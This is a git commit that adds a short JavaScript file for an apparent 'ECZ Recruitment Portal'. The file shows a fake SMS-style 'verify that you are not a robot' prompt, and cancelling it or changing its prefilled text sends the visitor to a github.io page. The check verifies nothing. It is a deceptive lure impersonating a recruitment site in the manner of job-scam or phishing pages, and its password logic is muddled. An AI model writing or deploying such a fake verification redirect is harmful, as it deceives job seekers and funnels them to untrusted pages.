002d5be3044f2ac59d70af8b689fc417122ab075
allregnws <promisebassey8081@gmail.com>
2025-05-13 13:30:38 +0100

    Create zz.js

---
+++ zz.js
@@ -0,0 +1,5 @@
+var password = 'ECZ RECRUITMENT PORTAL'
+password=prompt('SMS :Welcome to our recruitment portal. Click OK to verify that you are not a robot ','ECZ RECRUITMENT PORTAL');
+if (password != 'ECZ RECRUITMENT PORTAL') {
+location.href='https://allregnws.github.io/ECZ.Recruitment.Portal.zm';
+}
